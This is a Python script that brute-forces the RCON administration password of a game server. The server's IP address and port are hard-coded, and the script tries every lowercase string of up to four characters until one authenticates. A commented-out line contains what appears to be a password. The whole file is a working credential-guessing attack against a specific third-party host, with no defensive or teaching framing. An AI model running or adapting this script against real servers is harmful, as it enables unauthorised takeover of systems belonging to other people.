import aiorcon
import asyncio
import string
import time
import sys
from itertools import chain, product

ip = "94.130.143.254"
port = 27165
# rconpassword = "gold-squid"


def bruteforce(charset, maxlength):
    return (''.join(candidate)
        for candidate in chain.from_iterable(product(charset, repeat=i)
            for i in range(1, maxlength + 1)))


async def main(loop, rconpassword):
    # Attempt rcon connection
    rcon = await aiorcon.RCON.create(ip, port, rconpassword, loop)

    # Send a command
    status = await(rcon("status"))
    print(status)
    if 'hostname:' in status:
        print("Password is:", rconpassword)
        sys.exit(0);

    rcon.close()


for x in bruteforce(string.ascii_lowercase, 4):

    try:
        loop = asyncio.get_event_loop()
        loop.run_until_complete(main(loop, x))
        print("TRY")

    except Exception as e:
        print("EXCEPTION")
        error_check = repr(e)
        if 'Authentication failed' in error_check:
            print("AUTH CHECK")
            print("Fail:",str(e),"  [X]->  ",x)


